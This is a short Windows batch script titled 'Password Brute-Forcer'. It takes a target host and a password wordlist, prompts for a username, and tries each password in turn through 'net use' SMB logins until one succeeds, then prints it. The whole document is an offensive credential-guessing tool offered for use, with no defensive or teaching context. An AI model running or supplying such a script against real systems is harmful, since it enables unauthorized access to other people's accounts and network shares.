@echo off
title Password Brute-Forcer
echo.
set /p user="Enter username: "

set /a count=1
for /f %%a in (%2) do (
  set pass=%%a
  call :login
)
echo Password not found.
pause
exit

:found
echo.
echo Password found - %pass%.
net use \\%1 /d /y >nul 2>&1
pause
exit

:login
net use \\%1 /user:%user% %pass% >nul 2>&1
echo LOGIN ATTEMPT: %count% - %pass%
set /a count=%count%+1
if %errorlevel% EQU 0 goto found